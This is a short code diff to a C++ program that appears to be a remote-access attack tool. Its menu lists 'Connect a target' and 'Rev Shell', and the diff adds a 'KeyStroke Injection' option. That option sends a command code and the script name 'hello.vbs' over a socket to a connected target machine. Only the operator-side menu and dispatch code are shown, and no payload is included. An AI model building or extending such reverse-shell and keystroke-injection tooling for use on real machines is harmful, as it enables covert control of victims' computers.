@@ -82,7 +82,15 @@ int main(int argc, char *argv[])
                 }
                 break;
             }
-        
+            
+            case 3:
+            {
+                send_data(clientSocket,3);
+                send_data(clientSocket,"hello.vbs");
+                cout << ">> Sent " << endl;
+                system("pause");
+                break;
+            }
             case 0:
             {
                 send_data(clientSocket,0);
@@ -302,6 +310,7 @@ int Get_menu_option()
                                     
                                     Connect a target                        1
                                     Rev Shell                               2
+                                    KeyStroke Injection                     3
             
                                     Exit                                    0
 
